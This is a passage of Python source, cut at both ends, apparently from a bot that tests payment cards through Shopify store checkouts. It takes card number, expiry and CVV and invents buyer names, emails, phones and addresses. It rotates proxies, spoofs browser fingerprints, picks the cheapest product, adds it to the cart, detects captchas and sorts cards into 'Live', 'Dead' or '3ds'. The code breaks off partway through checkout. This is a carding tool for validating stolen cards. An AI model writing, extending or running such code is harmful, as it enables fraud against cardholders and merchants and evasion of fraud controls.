    "FI": {"address1": "Aleksanterinkatu 1", "city": "Helsinki", "postalCode": "00100", "zoneCode": "18", "countryCode": "FI", "phone": "09 1234567"},
    "IE": {"address1": "O'Connell Street", "city": "Dublin", "postalCode": "D01", "zoneCode": "D", "countryCode": "IE", "phone": "01 1234567"},
    "AT": {"address1": "Kärntner Straße 1", "city": "Vienna", "postalCode": "1010", "zoneCode": "9", "countryCode": "AT", "phone": "01 1234567"},
    "PL": {"address1": "Krakowskie Przedmieście", "city": "Warsaw", "postalCode": "00-068", "zoneCode": "MZ", "countryCode": "PL", "phone": "22 1234567"},
    "NZ": {"address1": "Queen Street", "city": "Auckland", "postalCode": "1010", "zoneCode": "AUK", "countryCode": "NZ", "phone": "09 1234567"},
    "SG": {"address1": "Orchard Road", "city": "Singapore", "postalCode": "238801", "zoneCode": "SG", "countryCode": "SG", "phone": "61234567"},
    "MX": {"address1": "Paseo de la Reforma", "city": "Mexico City", "postalCode": "06500", "zoneCode": "CMX", "countryCode": "MX", "phone": "55 1234 5678"},
    "BR": {"address1": "Avenida Paulista", "city": "São Paulo", "postalCode": "01311", "zoneCode": "SP", "countryCode": "BR", "phone": "11 1234 5678"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125550000"},
}

_US_ADDRESSES = [
    {"address1": "742 Evergreen Terrace", "city": "Springfield", "postalCode": "62704", "zoneCode": "IL", "countryCode": "US", "phone": "2175550000"},
    {"address1": "350 Fifth Avenue", "city": "New York", "postalCode": "10118", "zoneCode": "NY", "countryCode": "US", "phone": "2125550000"},
    {"address1": "1600 Pennsylvania Ave", "city": "Washington", "postalCode": "20500", "zoneCode": "DC", "countryCode": "US", "phone": "2025550000"},
    {"address1": "233 Spring Street", "city": "New York", "postalCode": "10013", "zoneCode": "NY", "countryCode": "US", "phone": "2125550000"},
    {"address1": "8601 Beverly Blvd", "city": "Los Angeles", "postalCode": "90048", "zoneCode": "CA", "countryCode": "US", "phone": "3105550000"},
    {"address1": "401 N Michigan Ave", "city": "Chicago", "postalCode": "60611", "zoneCode": "IL", "countryCode": "US", "phone": "3125550000"},
    {"address1": "200 E Randolph St", "city": "Chicago", "postalCode": "60601", "zoneCode": "IL", "countryCode": "US", "phone": "3125550000"},
    {"address1": "1001 4th Ave", "city": "Seattle", "postalCode": "98154", "zoneCode": "WA", "countryCode": "US", "phone": "2065550000"},
    {"address1": "500 Terry Francois Blvd", "city": "San Francisco", "postalCode": "94158", "zoneCode": "CA", "countryCode": "US", "phone": "4155550000"},
    {"address1": "700 Clark Ave", "city": "St. Louis", "postalCode": "63102", "zoneCode": "MO", "countryCode": "US", "phone": "3145550000"},
]

def pick_addr(url, cc=None, rc=None):
    addr = random.choice(_US_ADDRESSES).copy()
    try:
        street_parts = addr["address1"].split(" ", 1)
        if len(street_parts) > 1:
            addr["address1"] = f"{random.randint(100, 9999)} {street_parts[1]}"
    except Exception as exc:
        logger.debug("Suppressed exception: %s", exc, exc_info=True)
    return addr

def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

# التحسين: دالة extract_between محسّنة
def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = [
            "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph",
            "Thomas", "Christopher", "Charles", "Daniel", "Matthew", "Anthony", "Mark",
            "Donald", "Steven", "Andrew", "Paul", "Joshua", "Kenneth", "Kevin", "Brian",
            "George", "Timothy", "Ronald", "Jason", "Edward", "Jeffrey", "Ryan",
            "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan",
            "Jessica", "Sarah", "Karen", "Lisa", "Nancy", "Betty", "Margaret", "Sandra",
            "Ashley", "Dorothy", "Kimberly", "Emily", "Donna", "Michelle", "Carol",
            "Amanda", "Melissa", "Deborah", "Stephanie", "Rebecca", "Sharon", "Laura",
            "Cynthia", "Kathleen", "Amy", "Angela", "Shirley", "Brenda", "Emma", "Anna",
        ]
        last_names = [
            "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
            "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
            "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson",
            "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson",
            "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen",
            "Hill", "Flores", "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera",
            "Campbell", "Mitchell", "Carter", "Roberts", "Turner", "Phillips", "Parker",
        ]
        return (random.choice(first_names), random.choice(last_names))

    @staticmethod
    def generate_email(first, last):
        domains = [
            "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com",
            "aol.com", "mail.com", "proton.me", "zoho.com", "yandex.com",
            "gmx.com", "live.com",
        ]
        suffix = random.choice(['', '', str(random.randint(1, 99)), str(random.randint(100, 9999))])
        sep = random.choice(['.', '_', ''])
        return f"{first.lower()}{sep}{last.lower()}{suffix}@{random.choice(domains)}"

# التحسين: دالة extract_session_token محسّنة
def extract_session_token(text: str, headers) -> str:
    sst = headers.get('X-Checkout-One-Session-Token') or headers.get('x-checkout-one-session-token')
    if sst:
        return sst

    if not text:
        return None

    sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
    if sst: return sst
    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
    if sst: return sst
    sst = extract_between(text, '"serializedSessionToken":"', '"')
    if sst: return sst
    sst = extract_between(text, 'data-session-token="', '"')
    if sst: return sst
    sst = extract_between(text, '"sessionToken":"', '"')
    if sst: return sst

    match = re.search(r'"serializedSessionToken"\s*:\s*"([^"]+)"', text)
    if match: return match.group(1)

    match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', text)
    if match: return match.group(1)

    match = re.search(r'sessionToken\s*=\s*["\']([^"\']+)["\']', text)
    if match: return match.group(1)

    match = re.search(r'serializedSessionToken\s*=\s*["\']([^"\']+)["\']', text)
    if match: return match.group(1)

    match = re.search(r'sessionToken&quot;\s*:\s*&quot;([^&"]+)&quot;', text)
    if match: return match.group(1)

    match = re.search(r'serializedSessionToken&quot;\s*:\s*&quot;([^&"]+)&quot;', text)
    if match: return match.group(1)

    match = re.search(r'window\.serializedSessionToken\s*=\s*["\']([^"\']+)["\']', text)
    if match: return match.group(1)

    match = re.search(r'window\.sessionToken\s*=\s*["\']([^"\']+)["\']', text)
    if match: return match.group(1)

    return None

def _get_fallback_proxies(uid=None):
    try:
        from bot.core.config import PROXIES_FILE, ST_PROXIES_FILE, GW_PROXIES_FILE
    except ImportError:
        DATA_DIR = os.getenv('DATA_DIR', '/data')
        if not os.path.exists(DATA_DIR):
            DATA_DIR = os.path.dirname(os.path.abspath(__file__))
        PROXIES_FILE = os.path.join(DATA_DIR, 'proxies.txt')
        ST_PROXIES_FILE = os.path.join(DATA_DIR, 'st_proxies.txt')
        GW_PROXIES_FILE = os.path.join(DATA_DIR, 'gw_proxies.txt')

    proxy_files = [PROXIES_FILE, ST_PROXIES_FILE, GW_PROXIES_FILE]
    all_proxies = []

    for f_path in proxy_files:
        if os.path.exists(f_path):
            try:
                with open(f_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            parsed = parse_proxy(line)
                            if parsed and "example.com" not in parsed:
                                all_proxies.append(parsed)
            except Exception as exc:
                logger.debug("Suppressed exception: %s", exc, exc_info=True)
    return all_proxies

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.replace(" ", "").strip()
    if proxy_str.lower().startswith(('http://', 'https://', 'socks5://', 'socks5h://', 'socks4://', 'socks4a://', 'socks://')):
        return proxy_str
    if '@' in proxy_str:
        return f"http://{proxy_str}"
    parts = proxy_str.split(':')
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        # Supports user:password:ip:port format
        user, password, ip, port = parts[0], parts[1], parts[2], parts[3]
        # Also handles ip:port:user:password if first part looks like IP
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', parts[0]):
            ip, port, user, password = parts[0], parts[1], parts[2], parts[3]
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        return f"http://{proxy_str}" if proxy_str else None

def _rotate_fallback_proxy(current_proxy: str = None) -> str:
    try:
        candidates = _get_fallback_proxies()
        if not candidates:
            return None
        clean = [p for p in candidates if p != current_proxy]
        if not clean:
            clean = candidates
        return random.choice(clean)
    except Exception:
        return None

def is_captcha_required(response_text):
    if not response_text:
        return False
    lower = response_text.lower()
    indicators = [
        'captcha_required',
        'recaptcha',
        'hcaptcha',
        'g-recaptcha',
        'shopify-challenge',
        'challenge-form',
        'cf-challenge',
        'window._cf_chl_opt',
        'shopify_recaptcha',
        'recaptchav2',
        '"provider":"hcaptcha"',
    ]
    if any(ind in lower for ind in indicators):
        return True
    if '/challenge' in lower or 'action="/challenge"' in lower:
        return True
    return False

_CURL_RETRY_ERRORS = (
    'curl: (56)', 'curl: (52)', 'curl: (35)', 'curl: (28)', 'curl: (7)',
    'curl: (18)', 'curl: (92)', 'curl: (55)',
    'failure in receiving', 'receiving network data', 'without response',
    'connection reset', 'connection timed out', 'connection refused',
    'failed to perform', 'empty reply', 'network error', 'ssl handshake',
    'eof occurred', 'remote end closed', 'broken pipe', 'transfer closed',
)

async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=0, solve_captcha=True, proxy=None
):
    _internal_max = max(max_retries, 2)
    response = None
    response_text = ''
    for attempt in range(_internal_max + 1):
        try:
            response = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
            response_text = await response.text()
            return response, response_text, False
        except Exception as e:
            err_str = str(e).lower()
            is_curl_error = any(marker in err_str for marker in _CURL_RETRY_ERRORS)
            if attempt < _internal_max and is_curl_error:
                wait = min(0.5 * (2 ** attempt), 3.0)
                await asyncio.sleep(wait)
                continue
            if attempt >= _internal_max:
                return None, str(e), False
            await asyncio.sleep(random.uniform(0.3, 0.8))

    return response, response_text, False

_global_connector = None
_global_connector_loop = None

_PER_SITE_SEMAPHORES = {}
_PER_SITE_SEMAPHORE_REFS = {}
_PER_SITE_LOCK = None

def _get_max_per_site():
    try:
        import sys
        sys.path.append(os.path.dirname(os.path.abspath(__file__)))
        from bot.core.config import bot_settings
        return int(bot_settings.get("max_per_site", 2))
    except Exception:
        return 2

async def _get_site_semaphore(domain):
    global _PER_SITE_LOCK
    if _PER_SITE_LOCK is None:
        _PER_SITE_LOCK = asyncio.Lock()
    async with _PER_SITE_LOCK:
        if domain not in _PER_SITE_SEMAPHORES:
            limit = _get_max_per_site()
            _PER_SITE_SEMAPHORES[domain] = asyncio.Semaphore(limit)
            _PER_SITE_SEMAPHORE_REFS[domain] = 0
        _PER_SITE_SEMAPHORE_REFS[domain] = _PER_SITE_SEMAPHORE_REFS.get(domain, 0) + 1
        return _PER_SITE_SEMAPHORES[domain]


async def _release_site_semaphore(domain):
    global _PER_SITE_LOCK
    if _PER_SITE_LOCK is None:
        return
    async with _PER_SITE_LOCK:
        refs = _PER_SITE_SEMAPHORE_REFS.get(domain, 0) - 1
        if refs <= 0:
            _PER_SITE_SEMAPHORE_REFS.pop(domain, None)
            _PER_SITE_SEMAPHORES.pop(domain, None)
        else:
            _PER_SITE_SEMAPHORE_REFS[domain] = refs

def get_global_connector():
    global _global_connector, _global_connector_loop
    try:
        current_loop = asyncio.get_running_loop()
    except RuntimeError:
        current_loop = None

    if (_global_connector is None or
        _global_connector.closed or
        _global_connector_loop is not current_loop):
        _global_connector = aiohttp.TCPConnector(
            ssl=False,
            limit=500,
            limit_per_host=50,
            use_dns_cache=True,
            ttl_dns_cache=600,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
        )
        _global_connector_loop = current_loop
    return _global_connector

def prune_variant_cache():
    global _VARIANT_CACHE
    if len(_VARIANT_CACHE) > 1000:
        sorted_keys = sorted(_VARIANT_CACHE.keys(), key=lambda k: _VARIANT_CACHE[k][1])
        for k in sorted_keys[:-1000]:
            _VARIANT_CACHE.pop(k, None)

def normalize_cache_key(url):
    if not url:
        return ""
    url = url.strip().lower()
    if not url.startswith('http'):
        url = "https://" + url
    return url.rstrip('/')

# دالة fetch_products مع استخدام safe_json_loads
async def fetch_products(domain, proxy_str=None, timeout_sec=20):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain

        connector = get_global_connector()
        timeout = aiohttp.ClientTimeout(total=timeout_sec)
        proxy = parse_proxy(proxy_str) if proxy_str else None

        result = []
        last_err = ""
        currency = "USD"

        async with AiohttpCurlCffiSession(connector=connector, connector_owner=False, timeout=timeout) as session:
            try:
                async with session.get(
                    f"{domain}/products.json?limit=50",
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=min(8, timeout_sec)),
                    headers={"Connection": "keep-alive"}
                ) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        if "shopify" in text.lower() or "products" in text.lower():
                            result = safe_json_loads(text, {}).get('products', [])
                        else:
                            last_err = "Not a shopify response"
                    else:
                        last_err = f"HTTP {resp.status}"
            except Exception as e:
                err_s = str(e).lower()
                last_err = f"error: {str(e)}"
                if any(m in err_s for m in _CURL_RETRY_ERRORS):
                    await asyncio.sleep(1.0)
                    try:
                        async with session.get(
                            f"{domain}/products.json?limit=50",
                            proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=min(10, timeout_sec)),
                            headers={"Connection": "keep-alive"}
                        ) as resp2:
                            if resp2.status == 200:
                                text2 = await resp2.text()
                                if "shopify" in text2.lower() or "products" in text2.lower():
                                    result = safe_json_loads(text2, {}).get('products', [])
                                    last_err = ""
                    except Exception as exc:
                        logger.debug("Suppressed exception: %s", exc, exc_info=True)
            if not result:
                try:
                    async with session.get(f"{domain}/collections/all/products.json?limit=10", proxy=proxy, timeout=min(10, timeout_sec), headers={"Connection": "close"}) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            result = safe_json_loads(text, {}).get('products', [])
                        else:
                            last_err = f"HTTP {resp.status}"
                except Exception as e:
                    last_err = f"error: {str(e)}"

            if not result:
                for search_char in ['a', 'e', 'o', '']:
                    try:
                        search_url = f"{domain}/search/suggest.json?q={search_char}&resources[type]=product&resources[limit]=5"
                        async with session.get(search_url, proxy=proxy, timeout=min(6, timeout_sec), headers={"Connection": "close"}) as resp:
                            if resp.status == 200:
                                text = await resp.text()
                                search_data = safe_json_loads(text, {})
                                products = search_data.get('resources', {}).get('results', {}).get('products', [])
                                for p in products:
                                    url_path = p.get('url', '')
                                    handle = None
                                    if '/products/' in url_path:
                                        handle = url_path.split('/products/')[-1].split('?')[0]
                                    elif p.get('handle'):
                                        handle = p.get('handle')

                                    if handle:
                                        try:
                                            async with session.get(f"{domain}/products/{handle}.js", proxy=proxy, timeout=min(5, timeout_sec), headers={"Connection": "close"}) as p_resp:
                                                if p_resp.status == 200:
                                                    p_text = await p_resp.text()
                                                    p_json = safe_json_loads(p_text, {})
                                                    if p_json:
                                                        p_json['is_ajax'] = True
                                                        result.append(p_json)
                                        except Exception as exc:
                                            logger.debug("Suppressed exception: %s", exc, exc_info=True)
                            else:
                                last_err = f"HTTP {resp.status}"
                    except Exception as e:
                        last_err = f"error: {str(e)}"
                    if result:
                        break

            if result:
                try:
                    async with session.get(f"{domain}/cart.js", proxy=proxy, timeout=min(5, timeout_sec), headers={"Connection": "close"}) as cart_resp:
                        if cart_resp.status == 200:
                            cart_data = await cart_resp.json(content_type=None)
                            if isinstance(cart_data, dict) and cart_data.get('currency'):
                                currency = cart_data.get('currency').upper()
                except Exception as exc:
                    logger.debug("Suppressed exception: %s", exc, exc_info=True)
        if not result:
            if "HTTP" in last_err or "error" in last_err:
                return False, f"error: failed to fetch products ({last_err})"
            return False, "<b>No Products found on site!</b>"

        candidates = []
        rate = EXCHANGE_RATES.get(currency.upper(), 1.0)

        for product in result:
            variants = product.get('variants')
            if not variants:
                continue

            prod_requires_shipping = product.get('requires_shipping', True)

            for variant in variants:
                if not variant.get('available', True):
                    continue

                try:
                    price_raw = variant.get('price', '0')
                    if product.get('is_ajax'):
                        price = float(price_raw) / 100.0
                    else:
                        if isinstance(price_raw, str):
                            price = float(price_raw.replace(',', ''))
                        else:
                            price = float(price_raw)

                    if price <= 0:
                        continue

                    usd_price = price * rate
                    if usd_price < 1.00:
                        continue

                    v_requires_shipping = variant.get('requires_shipping', prod_requires_shipping)

                    candidates.append({
                        'price': price,
                        'usd_price': usd_price,
                        'requires_shipping': bool(v_requires_shipping),
                        'variant_id': str(variant['id']),
                        'handle': product.get('handle', ''),
                    })
                except (ValueError, TypeError, AttributeError):
                    continue

        if not candidates:
            return False, "<b>No Valid Products</b>"

        def _score(c):
            if c['usd_price'] > MAX_PRICE_USD:
                return float('inf')
            return c['usd_price'] if not c['requires_shipping'] else c['usd_price'] + 20.0

        candidates.sort(key=_score)
        best = candidates[0]

        if best['usd_price'] > MAX_PRICE_USD:
            return False, f"<b>No products under ${MAX_PRICE_USD:.2f} USD found</b>"

        min_product = {
            'site': domain,
            'price': f"{best['price']:.2f}",
            'usd_price': best['usd_price'],
            'variant_id': best['variant_id'],
            'link': f"{domain}/products/{best['handle']}",
            'requires_shipping': best['requires_shipping'],
            'currency': currency,
        }

        import time as _time
        usd_p = best['usd_price']
        if usd_p < 10.0:
            cache_ttl = 14400
        elif usd_p < 20.0:
            cache_ttl = 28800
        else:
            cache_ttl = 43200
        cache_key = normalize_cache_key(domain)
        prune_variant_cache()
        _VARIANT_CACHE[cache_key] = (min_product['variant_id'], _time.time(), min_product['requires_shipping'], currency, usd_p, cache_ttl)
        logger.info(f"[CACHE] Cached: {cache_key} -> variant_id: {min_product['variant_id']}, requires_shipping: {min_product['requires_shipping']}, currency: {currency}, usd_price: {usd_p:.2f}, ttl: {cache_ttl}s")
        return min_product

    except Exception as e:
        return False, f"error: {str(e)}"

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"

    message = str(message)

    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]

    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match

    words = message.split()
    if words:
        first_word = words[0].strip("{}:'\" ")
        if "_" in first_word and first_word.isupper():
            return first_word

    clean = re.sub(r'[{}"\[\]\\]', '', message).strip()
    clean = re.sub(r'<[^>]+>', '', clean).strip()
    return clean[:80] if clean else "UNKNOWN_ERROR"

# التحسين: دالة _build_result المحسّنة
def _build_result(cc_string, success, message, gateway, price, currency, site=""):
    try:
        from datetime import datetime
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logger.info(f"[{now_str}] {cc_string} | {gateway} | {message[:200]}")
    except Exception as exc:
        logger.debug("Suppressed exception: %s", exc, exc_info=True)
    clean_response = extract_clean_response(message)
    c_lower = clean_response.lower()

    is_site_error = False
    if not success:
        if any(kw in (message or '').lower() for kw in ['captcha_required', 'captcha required', 'security check', 'challenge required']):
            is_site_error = True
        elif any(kw in (message or '').upper() for kw in [
            'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
            'PAYMENT_AMOUNT_TOO_SMALL',
            'MINIMUM_ORDER',
            'ORDER_TOTAL_CHANGED',
            'DYNAMIC_PRICING_UNSUPPORTED',
            'PRICE_TOO_HIGH',
            'PENDING_TIMEOUT',
            'RATE_LIMITED_429',
        ]):
            is_site_error = True
        elif any(kw in c_lower for kw in ['failed to fetch products', 'cart failed', 'dns resolution failed', 'proxyerror', 'timeout', 'amount too small', 'minimum order', 'order total']):
            is_site_error = True
        else:
            card_decline_keywords = [
                'decline', 'fail', 'fraud', 'hold', 'pickup', 'stolen', 'lost',
                'cvv', 'cvc', 'expiry', 'expired', 'insufficient', 'fund', 'limit',
                'format', 'mismatch', 'invalid', 'restricted', 'error_code',
                'payment_failed', 'card_declined', 'do not honor', 'not honor',
                'blocked', 'unauthorized', 'generic_error',
                'required_artifacts_unavailable',
            ]
            success_keywords = ['placed', 'success', 'approved', 'thank you', 'order_placed']
            if (
                not any(kw in c_lower for kw in card_decline_keywords)
                and not any(kw in c_lower for kw in success_keywords)
            ):
                is_site_error = True

    if is_site_error:
        status_val = 'SITE_ERROR'
    elif any(x in c_lower for x in ['otp_required', 'otp required', '3ds_required', '3d_secure', '3d secure', 'authentication_required', 'actionrequired', 'step_up', 'secure_3d', 'challenge_required', 'three_d_secure', 'three-d-secure', 'three_d', 'three d', 'authenticate_three_d_secure', 'challenge']):
        status_val = '3ds'
    elif any(x in c_lower for x in ['order_placed', 'order placed', 'processedreceipt', 'approved', 'charged', 'thank you', 'payment successful', 'payment_successful', 'success', 'order completed']) and not any(neg in c_lower for neg in ['not approved', 'unsuccessful', 'failed', 'declined', 'could not be', 'was not', 'invalid', 'error', 'fraud', 'rejected']):
        status_val = 'Live'
    else:
        status_val = 'Dead'

    return {
        "Gateway": gateway,
        "Price": str(price) if price else "0.00",
        "Response": clean_response,
        "RawResponse": str(message),
        "Status": status_val,
        "cc": cc_string,
        "Currency": currency or "USD"
    }

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, timeout_sec=40, check_only=False, uid=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    site_url = site_url.strip()

    if '@' in site_url or '|' in site_url:
        m = re.match(r'^(https?://[a-zA-Z0-9.-]+)', site_url)
        if m:
            clean_host = m.group(1)
            clean_host = re.sub(r'\d+$', '', clean_host)
            site_url = clean_host
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"

    logger.info(f"[{cc}] Starting process_card for {site_url}...")

    site_domain = urlparse(ourl).netloc
    site_sem = await _get_site_semaphore(site_domain)
    try:
        async with site_sem:
            return await _process_card_inner(cc, mes, ano, cvv, ourl, variant_id, proxy_str, timeout_sec, check_only, uid)
    finally:
        await _release_site_semaphore(site_domain)

async def _process_card_inner(cc, mes, ano, cvv, ourl, variant_id=None, proxy_str=None, timeout_sec=40, check_only=False, uid=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    payment_identifier = None
    ourl = ourl.strip()
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"
    original_currency = "USD"

    resp_json = {}
    final_text = ""
    curr_sym = '$'

    try:
        _bp = _pick_browser_profile()

        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl + '/',
            'User-Agent': _bp['ua'],
            'sec-ch-ua': _bp['sec_ch_ua'],
            'sec-ch-ua-mobile': _bp['sec_ch_ua_mobile'],
            'sec-ch-ua-platform': _bp['sec_ch_ua_platform'],
            'DNT': '1',
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]

        phone_raw = address_info.get("phone", "2125550000")
        if country_code == "US" or country_code == "CA":
            phone = f"{phone_raw[:3]}-{phone_raw[3:6]}-{random.randint(1000, 9999)}"
        elif country_code == "GB":
            phone = f"+44 7700 {random.randint(900000, 999999)}"
        elif country_code == "AU":
            phone = f"+61 491 570 {random.randint(100, 999)}"
        else:
            if len(phone_raw) > 4:
                phone = phone_raw[:-4] + str(random.randint(1000, 9999))
            else:
                phone = phone_raw + str(random.randint(1000, 9999))

        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)

        street = address_info.get("address1", "123 Main St")
        street = f"{street} Apt {random.randint(1, 999)}"

        city = address_info.get("city", "New York")
        state = address_info.get("zoneCode", "NY")
        s_zip = address_info.get("postalCode", "10001")

        address2_choices = [
            f"Apt {random.randint(1, 999)}",
            f"Suite {random.randint(100, 999)}",
            f"Unit {random.randint(1, 99)}",
            f"Room {random.randint(10, 99)}",
            f"Floor {random.randint(1, 5)}"
        ]
        address2 = random.choice(address2_choices)

        _cached_requires_shipping = None
        if not variant_id:
            now = time.time()
            cache_key = normalize_cache_key(ourl)
            cached = _VARIANT_CACHE.get(cache_key)

            if cached:
                _cache_ttl = cached[5] if len(cached) > 5 else 7200
                if (now - cached[1]) < _cache_ttl:
                    variant_id = cached[0]
                    _cached_requires_shipping = cached[2] if len(cached) > 2 else None
                    _cached_currency = cached[3] if len(cached) > 3 else "USD"
                    currency = _cached_currency
                    _cached_usd_price = cached[4] if len(cached) > 4 else None
                    logger.info(f"[CACHE] Hit for cache_key: {cache_key} -> variant_id: {variant_id}, usd_price: {_cached_usd_price}, ttl: {_cache_ttl}s")
                else:
                    logger.info(f"[CACHE] Expired (TTL {_cache_ttl}s) for {cache_key}, deleting...")
                    _VARIANT_CACHE.pop(cache_key, None)
                    cached = None

            if not variant_id:
                logger.info(f"[CACHE] Miss or Expired for cache_key: {cache_key}. Fetching products...")
                info = await fetch_products(ourl, proxy_str, timeout_sec=min(20, timeout_sec))

                if isinstance(info, tuple) and info[0] is False:
                    error_msg = info[1] if len(info) > 1 else "Failed to fetch products"
                    logger.error(f"[CACHE] Fetch failed: {error_msg}")
                    return False, f"SITE_ERROR: {error_msg}", gateway, total_price, currency
                else:
                    variant_id = info['variant_id']
                    _cached_requires_shipping = info.get('requires_shipping', True)
                    _cached_currency = info.get('currency', 'USD')
                    currency = _cached_currency
                    logger.info(f"[CACHE] Successfully fetched fresh product: {variant_id}")
                    prune_variant_cache()

        connector = get_global_connector()
        timeout = aiohttp.ClientTimeout(total=timeout_sec, sock_read=min(15, timeout_sec))

        async with AiohttpCurlCffiSession(connector=connector, connector_owner=False, timeout=timeout, browser_profile=_bp) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            _session_is_fresh = not getattr(session.session, '_shopify_prewarmed', False)
            if _session_is_fresh:
                try:
                    prewarm_headers = {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'User-Agent': _bp['ua'],
                        'sec-ch-ua': _bp['sec_ch_ua'],
                        'sec-ch-ua-mobile': _bp['sec_ch_ua_mobile'],
                        'sec-ch-ua-platform': _bp['sec_ch_ua_platform'],
                        'Upgrade-Insecure-Requests': '1',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'none',
                        'sec-fetch-user': '?1',
                        'DNT': '1',
                    }
                    prewarm_resp = await session.get(url + '/', headers=prewarm_headers, proxy=proxy)
                    prewarm_resp.close()
                    await asyncio.sleep(random.uniform(0.8, 2.0))
                    try:
                        session.session._shopify_prewarmed = True
                    except Exception as exc:
                        logger.debug("Suppressed exception: %s", exc, exc_info=True)
                except Exception as exc:
                    logger.debug("Suppressed exception: %s", exc, exc_info=True)
            cart_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/javascript',
                'X-Requested-With': 'XMLHttpRequest',
            }
            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
            await cart_resp.read()

            if cart_resp.status != 200:
                cart_headers_alt = {
                    **headers,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
                cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
                await cart_resp.read()

            if cart_resp.status != 200:
                try:
                    text_lower = (await cart_resp.text()).lower()
                except Exception:
                    text_lower = ""
                is_permanent = cart_resp.status in (404, 422) or any(w in text_lower for w in ["sold out", "not found", "unavailable", "exist"])
                is_server_error = cart_resp.status >= 500
                if is_permanent:
                    cache_key = normalize_cache_key(ourl)
                    _VARIANT_CACHE.pop(cache_key, None)
                    is_sold_out = any(w in text_lower for w in ["sold out", "not found", "unavailable"])
                    if is_sold_out:
                        logger.info(f"[CART] Variant {variant_id} sold out / unavailable on {ourl}, fetching fresh...")
                        fresh_info = await fetch_products(ourl, proxy_str, timeout_sec=min(15, timeout_sec))
                        if isinstance(fresh_info, dict) and fresh_info.get('variant_id'):
                            variant_id = fresh_info['variant_id']
                            fresh_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
                            await fresh_resp.read()
                            if fresh_resp.status == 200:
                                await asyncio.sleep(random.uniform(0.8, 2.0))
                            else:
                                return False, f"Cart failed with status {cart_resp.status} (sold out, fresh variant also failed)", gateway, total_price, currency
                        else:
                            return False, "No valid products found (all sold out?)", gateway, total_price, currency
                if is_server_error:
                    return False, f"Proxy Error: Cart server error {cart_resp.status}", gateway, total_price, currency
                if cart_resp.status != 200:
                    return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency

            await asyncio.sleep(random.uniform(1.2, 2.8))

            checkout_headers = {
                **headers,
